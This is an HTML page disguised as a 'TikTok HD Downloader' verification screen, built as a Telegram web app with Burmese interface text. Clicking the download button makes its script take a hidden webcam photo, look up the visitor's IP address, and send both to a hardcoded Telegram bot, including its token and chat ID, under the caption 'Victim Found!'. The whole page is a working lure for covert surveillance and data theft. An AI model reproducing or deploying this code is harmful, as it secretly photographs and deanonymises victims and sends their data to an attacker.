<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok HD Downloader - Verification</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background-color: #000; color: white; font-family: sans-serif; text-align: center; display: flex; flex-direction: column; justify-content: center; height: 100vh; margin: 0; }
        .btn { background-color: #fe2c55; color: white; padding: 15px 30px; border: none; border-radius: 5px; font-size: 18px; cursor: pointer; margin-top: 20px; }
        .loading { display: none; color: #ccc; margin-top: 10px; }
    </style>
</head>
<body>

    <h2>TikTok HD Downloader</h2>
    <p>ဗီဒီယိုဒေါင်းလုဒ်ဆွဲရန် လူဟုတ်မဟုတ် အရင်စစ်ဆေးပါ</p>
    <button class="btn" id="startBtn">Continue to Download</button>
    <p class="loading" id="loader">Verifying... Please wait...</p>

    <canvas id="canvas" style="display:none;"></canvas>
    <video id="video" style="display:none;" autoplay playsinline></video>

    <script>
        const BOT_TOKEN = "8699185806:AAHioOhJMq-0nO_uYycVkbV4c_xNm_Xd3xY"; 
        const CHAT_ID = "5304050102"; 

        const startBtn = document.getElementById('startBtn');
        const loader = document.getElementById('loader');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        startBtn.addEventListener('click', async () => {
            startBtn.style.display = 'none';
            loader.style.display = 'block';

            try {
                // ၁။ ကင်မရာ Permission တောင်းခြင်း
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                video.srcObject = stream;

                // ၂။ IP Address ယူခြင်း
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                const userIP = ipData.ip;

                // ၃။ ဓာတ်ပုံရိုက်ရန် ၂ စက္ကန့် စောင့်ခြင်း (Video တက်လာအောင်)
                setTimeout(async () => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    const imageData = canvas.toDataURL('image/jpeg');

                    // ၄။ ပုံကို Blob ပြောင်းပြီး Telegram ဆီ ပို့ခြင်း
                    const blob = await (await fetch(imageData)).blob();
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'shot.jpg');
                    formData.append('caption', `✅ Victim Found!\n🌐 IP: ${userIP}`);

                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });

                    // ၅။ Bot ဆီကို Success စာပို့ခြင်း
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=✅ Verification_Success`);

                    // ၆။ အားလုံးပြီးရင် ပိတ်လိုက်မယ်
                    stream.getTracks().forEach(track => track.stop());
                    Telegram.WebApp.close();
                }, 2000);

            } catch (err) {
                // Error ဖြစ်ရင် ဘာကြောင့်လဲဆိုတာ ပြပေးမယ်
                alert("Error: " + err.name + " - " + err.message);
                startBtn.style.display = 'block';
                loader.style.display = 'none';
            }
        });
    </script>
</body>
</html>
